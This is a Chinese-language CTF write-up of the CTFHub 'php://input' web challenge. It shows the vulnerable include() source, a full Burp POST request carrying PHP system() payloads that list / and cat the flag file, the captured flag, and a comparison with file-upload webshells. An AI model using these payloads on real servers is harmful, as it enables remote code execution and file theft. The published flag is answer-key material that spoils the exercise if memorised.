【CTFHub】Web-RCE php://input 伪协议 Writeup

操作者：何芊宏 | 操作日期：2026.9.26 | 分类：CTF | 标签：CTFHub, Web, RCE, 文件包含, php://input, BurpSuite社区版, 横向对比

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - RCE / php://input
  • 题目名称：php://input
  • 环境：VS Code + Burp Suite 社区版自带浏览器。
  • 目标：利用 PHP 的 php://input 伪协议，在无物理木马文件的情况下，直接通过 POST 请求体执行 PHP 代码，实现 RCE。

2. 解题思路与知识点

本关核心考点：利用 php://input 伪协议绕过文件包含限制并执行任意代码。

知识点（比喻说明）：
  • php://input 伪协议：可以把请求的 POST Body 当成一个文件。当使用 include("php://input") 时，服务器会将 POST 请求体里的内容当成 PHP 代码去执行。
  • 与文件上传的区别：文件上传需要物理落地一个木马文件并访问它；而 php://input 相当于“后厨直达传送带”，无需落地物理文件，POST 数据随传随执行。
  • 过滤逻辑分析：源码限制了 file 参数必须以 php:// 开头。这意味着传统的包含本地文件（如 shell.txt）的战术失效，必须使用伪协议破局。

3. 详细步骤

第一步：源码审计

<?php
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 6) === "php://" ) {
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>

代码逐行解析：

  • substr($_GET["file"], 0, 6) === "php://"：核心过滤逻辑，只允许包含以 php:// 开头的伪协议。
  • include($_GET["file"]);：包含漏洞点。由于过滤了开头，只能利用 php://input。

获得信息：靶场无物理木马，提示“i don't have shell”，必须使用 php://input 打 POST。

第二步：配置 Burp 并构造 POST 请求

为什么要输入：由于 php://input 专门读取 POST 请求体，必须使用 Burp 拦截并改为 POST 请求。

实际使用工具：Burp Suite 社区版自带浏览器 + Repeater 模块。

Burp 修改要点：

  • 将第一行请求方法由 GET 改为 POST。
  • URL 改为 POST /?file=php://input HTTP/1.1。
  • Body 处必须空一行，然后写入 PHP 代码：<?php system('ls /'); ?>。
  • Content-Length 严格等于 Body 字节数。

实际请求体内容：

POST /?file=php://input HTTP/1.1
Host: challenge-9f5c0af2d5de09e5.sandbox.ctfhub.com:10800
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

<?php system('ls /'); ?>

第三步：执行命令寻找 Flag

回显结果：Response 响应中列出根目录，发现目标文件 flag_13611。

获得信息：确定目标绝对路径为 /flag_13611。

第四步：读取 Flag 并提交

修改 Body 为：<?php system('cat /flag_13611'); ?>，点击 Send。

回显结果：ctfhub{fadecaba3920dcb6e5932c5a}

4. 踩坑记录与复盘

  • Burp 社区版长度计算陷阱： 手动修改 Body 后，社区版 BP 有时无法准确自动更新 Content-Length，必须在请求头手动修改，否则会报 400 Bad Request。
  • GET 与 POST 混淆： php://input 只能读 POST 原始字节流。如果不改为 POST，或者把代码拼在 URL 里，包含将失败且无回显。
  • 空格与转义： 在 Repeater 中写 Payload 不受 URL 地址栏转义影响，直接写最标准的 PHP 代码即可。

5. 知识总结与横向对比

核心心得：
刚做完这题，我立刻联想到之前练习过的文件上传漏洞。它们的本质惊人地相似——都在试图让服务器执行我们的恶意代码（一句话木马）。但在实现路径上，却有着截然不同的轨迹。以下是两者的详细横向对比，方便以后遇到同类题目时迅速找到破局点。
对比维度 文件上传漏洞 php://input (文件包含)
核心载体 物理文件（如 shell.php, shell.jpg） 内存数据流（POST 请求体中的原始数据）
落地方式 必须将文件写入服务器硬盘（落地） 无需落地，代码随请求即时传输并执行
触发方式 需二次访问：先上传，再访问文件 URL 触发木马 一步到位：包含伪协议的同时，立即执行 Body 中的代码
过滤与绕过 需绕过前端 JS、MIME 类型、文件头、黑名单后缀等重重检测 只需满足包含点的路径前缀限制（如强制以 php:// 开头）
Payload 构造 构造 multipart/form-data 请求，将木马隐藏在文件内容中 将请求改为 POST，在 Body 中直接写入带 <?php ?> 的代码
利用条件 存在上传点，且上传目录具备执行权限 存在文件包含点，且服务端开启了 allow_url_include
总结（攻击链思维）：
  • 文件上传：需要完成“上传 -> 绕过检测 -> 落地 -> 访问触发”的完整链条，任何一环被拦截都会失败，对服务器的配置要求更高。
  • php://input：本质是“发送载荷 -> 服务端直接执行”，攻击路径极短，没有物理落地文件的环节，是文件包含漏洞中最干净、最迅速的利用方式。
  • 两者的终极目标一致：只要“木马”能在服务器上执行，接下来的操作（如 ls / 和 cat /flag）是完全通用的。
